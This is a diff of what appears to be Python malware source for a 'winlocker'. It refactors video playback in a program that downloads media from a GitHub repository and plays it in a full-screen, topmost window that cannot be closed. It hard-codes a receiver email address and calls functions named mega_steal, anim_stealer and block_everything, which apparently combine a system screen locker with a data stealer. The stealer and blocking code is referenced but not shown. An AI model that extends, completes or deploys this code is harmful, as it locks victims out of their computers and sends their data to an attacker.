@@ -26,8 +26,7 @@ RECEIVER_EMAIL = "xzx78848@gmail.com"
 VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/preview.mp4"
 MUSIC_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/them%D0%B3.mp3"
 LOGO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/icon.png"
-VIDEO_PATH_1 = os.path.join(tempfile.gettempdir(), "Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc)(1)")
-VIDEO_PATH_2 = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4")
+VIDEO_PATH = os.path.join(tempfile.gettempdir(), "preview.mp4")
 MUSIC_PATH = os.path.join(tempfile.gettempdir(), "theme.mp3")
 LOGO_PATH = os.path.join(tempfile.gettempdir(), "icon.png")
 attempts_left = MAX_ATTEMPTS
@@ -194,109 +193,43 @@ def anim_connect():
         current += line + "\n"; lbl.config(text=current); a.update(); time.sleep(0.4)
     time.sleep(3); a.destroy()
 
-def play_video_1():
-    play_video_generic(VIDEO_PATH_1, "VIDEO 1")
-
-def play_video_2():
-    play_video_generic(VIDEO_PATH_2, "VIDEO 2")
-
-def play_video_generic(video_path, video_name):
-    try:
-        download_file(VIDEO_URL, video_path)
-    except:
-        return
-
-    if not os.path.exists(video_path) or os.path.getsize(video_path) < 1000:
-        return
-
+def play_video():
+    try: download_file(VIDEO_URL, VIDEO_PATH)
+    except: return
     time.sleep(0.3)
-
-    video_window = tk.Tk()
-    video_window.attributes('-fullscreen', True)
-    video_window.attributes('-topmost', True)
-    video_window.configure(bg='black')
-    video_window.overrideredirect(True)
-    video_window.protocol("WM_DELETE_WINDOW", lambda: None)
-
-    lbl = tk.Label(video_window, bg='black')
-    lbl.pack(expand=True, fill='both')
-
     try:
-        import pygame
-        pygame.init()
-        pygame.display.set_mode((1, 1), pygame.NOFRAME)
-        pygame.mixer.quit()
-        pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=4096)
-    except:
-        video_window.destroy()
-        return
-
-    stop_video = threading.Event()
-
-    def play_audio():
-        try:
-            pygame.mixer.music.load(video_path)
-            pygame.mixer.music.set_volume(1.0)
-            pygame.mixer.music.play()
-            while pygame.mixer.music.get_busy() and not stop_video.is_set():
-                time.sleep(0.05)
+        v = tk.Tk(); v.attributes('-fullscreen', True); v.attributes('-topmost', True)
+        v.configure(bg='black'); v.overrideredirect(True)
+        v.protocol("WM_DELETE_WINDOW", lambda: None)
+        lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
+        try: subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', VIDEO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
         except:
-            pass
-
-    audio_thread = threading.Thread(target=play_audio, daemon=True)
-    audio_thread.start()
-
-    cap = cv2.VideoCapture(video_path)
-    if not cap.isOpened():
-        pygame.mixer.music.stop()
-        video_window.destroy()
-        return
-
-    fps = cap.get(cv2.CAP_PROP_FPS)
-    if fps <= 0:
-        fps = 30
-
-    sw = video_window.winfo_screenwidth()
-    sh = video_window.winfo_screenheight()
-
-    try:
-        frame_count = 0
-        start_time = time.time()
-
-        while cap.isOpened():
-            ret, frame = cap.read()
-            if not ret:
-                break
-
-            frame_count += 1
-
-            expected_elapsed = frame_count / fps
-            actual_elapsed = time.time() - start_time
-            if expected_elapsed > actual_elapsed:
-                time.sleep(expected_elapsed - actual_elapsed)
-
-            frame = cv2.resize(frame, (sw, sh))
-            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-
-            img = tk.PhotoImage(data=cv2.imencode('.ppm', frame)[1].tobytes())
-            lbl.config(image=img)
-            lbl.image = img
-            video_window.update()
-
-    except:
-        pass
-    finally:
-        stop_video.set()
-        cap.release()
-        try:
-            pygame.mixer.music.stop()
-            pygame.quit()
-        except:
-            pass
-        try:
-            video_window.destroy()
-        except:
-            pass
+            try:
+                import pygame; pygame.mixer.init()
+                pygame.mixer.music.load(VIDEO_PATH); pygame.mixer.music.play()
+            except: pass
+        cap = cv2.VideoCapture(VIDEO_PATH)
+        if cap.isOpened():
+            fps = cap.get(cv2.CAP_PROP_FPS)
+            if fps <= 0: fps = 30
+            sw, sh = v.winfo_screenwidth(), v.winfo_screenheight()
+            fc = 0; vs = time.time()
+            while cap.isOpened():
+                ret, frame = cap.read()
+                if not ret: break
+                fc += 1
+                expected = fc / fps
+                elapsed = time.time() - vs
+                if expected > elapsed: time.sleep(expected - elapsed)
+                frame = cv2.resize(frame, (sw, sh))
+                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                img = tk.PhotoImage(data=cv2.imencode('.ppm', frame)[1].tobytes())
+                lbl.config(image=img); lbl.image = img; v.update()
+            cap.release()
+        v.destroy()
+        try: pygame.mixer.music.stop()
+        except: pass
+    except: pass
 
 def mega_steal():
     report = ["="*60, "SYSTEM REPORT", "="*60]
@@ -457,12 +390,7 @@ if __name__ == "__main__":
     anim_fsociety()
     anim_stealer()
     anim_connect()
-    
-    # Воспроизводим первое видео
-    play_video_1()
-    # Воспроизводим второе видео
-    play_video_2()
-    
+    play_video()
     block_everything()
     Updater()
     tk.mainloop()
